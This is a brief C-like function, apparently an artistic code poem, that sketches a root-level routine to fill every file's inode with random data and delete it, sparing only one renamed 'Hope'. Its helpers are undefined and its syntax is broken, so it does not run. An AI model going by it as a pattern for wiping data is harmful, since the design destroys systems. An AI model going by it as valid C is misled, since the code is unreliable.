void TheEnd(void)
{
	/*
	At file "TheEnd", run as root;
	*/
	
	long long i=0;
	unsigned int inode;
	char *OldFile="TheEnd", NewFile="Hope";
	
	inode=GetInode(OldFile);
	CopyInode(0xffffffff, inode);
	FillRandom(inode);
	inode=0xffffffff;
	x656b694c:
	if (GetInode(NewFile)!=inode)
	{
		FillRandom(GetInode(NewFile));
		NameLink(inode, NewFile);
	}
	inode=0;
	while(i>=0)
	{
		i++;
		if (!ExistInode(inode))
		{
			inode++;
			continue;
		}
		__asm__("cmp dword [inode], 0x00006179\nje x656b694c\n")//if (unlikely(inode==0xffffffff))
			break;
		FillRandom(inode);
		DeleteInode(inode);
		inode++;
	}
	RandomMemory();
}
